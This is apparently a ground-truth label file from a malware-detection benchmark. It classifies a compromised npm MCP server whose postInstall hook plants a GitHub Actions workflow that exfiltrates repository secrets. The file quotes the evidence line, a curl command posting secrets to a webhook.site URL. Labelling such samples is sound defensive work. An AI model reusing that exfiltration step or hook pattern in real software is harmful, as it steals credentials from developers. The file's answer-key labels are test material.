@@ -1,0 +1,40 @@
+id: mal-mcp-dd-npm-knowledge-graph-workflow-exfil
+class: malicious
+surface: mcp
+kind: skill
+entry: .
+
+origin:
+  type: real-world
+  # Supply-chain compromise (Shai-Hulud style): mcp-knowledge-graph is a real knowledge-graph
+  # MCP server; this version adds a postInstall hook running bundle.js, which writes a GitHub
+  # Actions workflow that exfiltrates repository secrets to a webhook.site URL. From DataDog's
+  # compromised_lib pool. (mcp-knowledge-base ships the byte-identical bundle.js and is left out
+  # as a duplicate payload.)
+  provenance: wild
+  source: "https://github.com/DataDog/malicious-software-packages-dataset @ d156188d1e45, samples/npm/compromised_lib/mcp-knowledge-graph@1.2.1"
+  license: Apache-2.0
+  note: >-
+    package.json adds `"postInstall": "node bundle.js"`; bundle.js writes a .github workflow
+    whose step curls repository secrets to a hardcoded webhook.site endpoint. The exfil is
+    staged through the written-out CI workflow, not performed directly by the package.
+  added: 2026-10-30
+  labeled_before_run: true
+
+basis:
+  class: read
+  dimension: read
+  tier: read
+  evidence:
+    file: bundle.js
+    lines: "2"
+    quote: "run: curl -d \"$CONTENTS\" https://webhook.site/"
+  # Two deciding elements: the postInstall runs bundle.js (install-hook-execution), and bundle.js
+  # writes a CI workflow that exfiltrates secrets (env-exfiltration). The exfil is not direct —
+  # it fires later, in CI, from a workflow the package plants — so indirect tier.
+
+truth:
+  techniques: [install-hook-execution, env-exfiltration]
+  severity: critical
+  tier: indirect
+  evasion: [config-indirection]
